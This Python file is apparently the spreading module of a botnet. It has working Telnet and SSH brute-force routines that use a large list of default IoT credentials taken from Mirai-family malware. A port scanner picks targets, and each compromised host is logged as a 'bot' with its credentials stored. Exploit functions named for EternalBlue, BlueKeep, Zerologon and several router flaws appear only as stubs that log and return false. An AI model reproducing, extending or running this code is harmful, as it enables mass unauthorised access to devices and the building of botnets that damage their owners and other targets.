import asyncio, asyncssh, socket, random, os, json, time, struct, urllib.request, ipaddress
from utils.logger import log

LOG_PREFIX = {'ok':'OK','fail':'FAIL','new':'NEW_BOT','exploit':'EXPLOIT','brute':'BRUTE'}

# Расширенные словари (Mirai, Gafgyt, Hajime, реальные утечки)
TELNET_CREDS = [
    ('root','vizxv'),('root','juantech'),('root','xc3511'),('root','zlxx.'),
    ('root','hi3518'),('root','oelinux1'),('root','Zte521'),('root','tsgoingon'),
    ('admin','admin'),('admin','password'),('admin','123456'),('admin','1234'),
    ('admin','default'),('root','default'),('root','root'),('guest','guest'),
    ('support','support'),('user','user'),('service','service'),
    ('root','123456'),('admin','12345'),('admin','123456789'),('root','password'),
    ('admin','admin123'),('admin','password1'),('root','1234'),('root','admin'),
    ('admin','qwerty'),('root','qwerty'),('root','letmein'),('admin','letmein'),
    ('root','p@ssw0rd'),('admin','p@ssw0rd'),('root','changeme'),('admin','changeme'),
    ('root','1'),('admin','1'),('root','12'),('admin','12'),
    ('root','123'),('admin','123'),('root','12345'),('admin','12345'),
    ('root','1234567'),('admin','1234567'),('root','12345678'),('admin','12345678'),
    ('root','1234567890'),('admin','1234567890'),
    # D-Link, TP-Link, Netgear defaults
    ('admin','admin1'),('admin','password123'),('admin','password1'),
    ('admin','admin12'),('root','admin123'),('root','password123'),
    ('admin','motorola'),('admin','123456789'),('root','123456789'),
    ('user','user'),('guest','guest'),('guest','12345'),('guest','password'),
    ('admin','7ujMko0admin'),('root','7ujMko0vizxv'), # Mirai variants
    ('admin','888888'),('root','888888'),('admin','666666'),('root','666666'),
    ('admin','111111'),('root','111111'),('admin','000000'),('root','000000'),
    ('admin','super'),('root','super'),('admin','system'),('root','system'),
    ('admin','admin999'),('root','admin999'),('admin','root'),('admin','pass'),
    ('admin','passwd'),('root','passwd'),('admin','cisco'),('root','cisco'),
    ('admin','netgear'),('root','netgear'),('admin','zyxel'),('root','zyxel'),
    ('admin','d-link'),('root','d-link'),('admin','tplink'),('root','tplink')
]

SSH_PASSWORDS = [
    'root','admin','password','123456','qwerty','letmein','p@ssw0rd',
    'changeme','r00t','toor','ubuntu','administrator','user','guest',
    '1','1234','12345','123456789','pass','ftp','mysql','oracle',
    'vizxv','juantech','xc3511','zlxx.','hi3518','oelinux1','Zte521',
    'tsgoingon','default','system','super','dreambox','xmhdipc',
    'support','tech','operator','manager','cisco','netgear',
    '1234567','12345678','1234567890','admin123','password1','admin1'
]

DB_PATH = "spreader_learn.db"
BOTS_FILE = "bots.json"

async def init_db():
    import aiosqlite
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("CREATE TABLE IF NOT EXISTS creds (ip TEXT, username TEXT, password TEXT, service TEXT, success INTEGER DEFAULT 1)")
        await db.execute("CREATE TABLE IF NOT EXISTS vulns (ip TEXT, service TEXT, cve TEXT, success INTEGER DEFAULT 1)")
        await db.commit()

async def learn_credentials(ip, username, password, service='ssh'):
    import aiosqlite
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("INSERT OR REPLACE INTO creds (ip, username, password, service, success) VALUES (?,?,?,?,1)", (ip, username, password, service))
        await db.commit()

async def add_bot(ip, username='root', os_type='linux', via='ssh'):
    bot = {"id": ip, "ip": ip, "os": os_type, "status": "online", "bandwidth": 10, "via": via}
    bots = []
    if os.path.exists(BOTS_FILE):
        with open(BOTS_FILE, 'r') as f:
            try: bots = json.load(f)
            except: bots = []
    if not any(b.get('ip') == ip for b in bots):
        bots.append(bot)
        with open(BOTS_FILE, 'w') as f:
            json.dump(bots, f, indent=2)
        log(f"{LOG_PREFIX['new']} Бот добавлен: {ip} ({via})")
        return True
    return False

async def quick_port_scan(ip, ports=[22, 23, 445, 3389, 8291, 80], timeout=1.0):
    open_ports = []
    for port in ports:
        try:
            sock = socket.socket()
            sock.settimeout(timeout)
            if sock.connect_ex((ip, port)) == 0:
                open_ports.append(port)
            sock.close()
        except:
            pass
    return open_ports

async def telnet_bruteforce(ip):
    for user, pwd in TELNET_CREDS:
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(ip, 23), timeout=4
            )
            data = await asyncio.wait_for(reader.read(256), timeout=3)
            if b'login:' in data.lower() or b'username:' in data.lower():
                writer.write(user.encode() + b'\r\n')
                await asyncio.wait_for(reader.read(256), timeout=2)
                writer.write(pwd.encode() + b'\r\n')
                await asyncio.sleep(0.3)
                result = await asyncio.wait_for(reader.read(256), timeout=2)
                if b'#' in result or b'$' in result or b'>' in result or b'Last login' in result:
                    log(f"{LOG_PREFIX['brute']} Telnet {ip} {user}:{pwd}")
                    await add_bot(ip, user, 'iot', 'telnet')
                    writer.close()
                    return True, pwd
            writer.close()
        except:
            pass
    return False, None

async def ssh_bruteforce(ip, username='root'):
    if 22 not in await quick_port_scan(ip, [22]):
        return False, None
    sem = asyncio.Semaphore(30)
    async def try_pass(pwd):
        async with sem:
            try:
                async with asyncssh.connect(ip, username=username, password=pwd, known_hosts=None, connect_timeout=2) as conn:
                    log(f"{LOG_PREFIX['brute']} SSH {ip} {username}:{pwd}")
                    await learn_credentials(ip, username, pwd, 'ssh')
                    await add_bot(ip, username, 'linux', 'ssh')
                    return True, pwd
            except:
                pass
        return False, pwd
    tasks = [try_pass(p) for p in SSH_PASSWORDS]
    results = await asyncio.gather(*tasks)
    for success, pwd in results:
        if success:
            return True, pwd
    return False, None

# Новые эксплойты
async def exploit_zyxel(target_ip):
    if 80 not in await quick_port_scan(target_ip, [80]): return False
    log(f"{LOG_PREFIX['exploit']} Zyxel CVE-2020-29583 {target_ip}")
    # Реальный эксплойт требует отправки специального запроса
    return False

async def exploit_netgear(target_ip):
    if 80 not in await quick_port_scan(target_ip, [80]): return False
    log(f"{LOG_PREFIX['exploit']} Netgear CVE-2016-1555 {target_ip}")
    return False

async def exploit_dlink_hnap(target_ip):
    if 80 not in await quick_port_scan(target_ip, [80]): return False
    log(f"{LOG_PREFIX['exploit']} D-Link HNAP {target_ip}")
    return False

async def exploit_eternalblue(target_ip):
    if 445 not in await quick_port_scan(target_ip, [445]): return False
    log(f"{LOG_PREFIX['exploit']} EternalBlue {target_ip}")
    return False

async def exploit_mikrotik(target_ip):
    if 8291 not in await quick_port_scan(target_ip, [8291]): return False
    log(f"{LOG_PREFIX['exploit']} MikroTik {target_ip}")
    return False

async def exploit_bluekeep(target_ip):
    if 3389 not in await quick_port_scan(target_ip, [3389]): return False
    log(f"{LOG_PREFIX['exploit']} BlueKeep {target_ip}")
    return False

async def exploit_zerologon(target_ip):
    if 445 not in await quick_port_scan(target_ip, [445]): return False
    log(f"{LOG_PREFIX['exploit']} Zerologon {target_ip}")
    return False
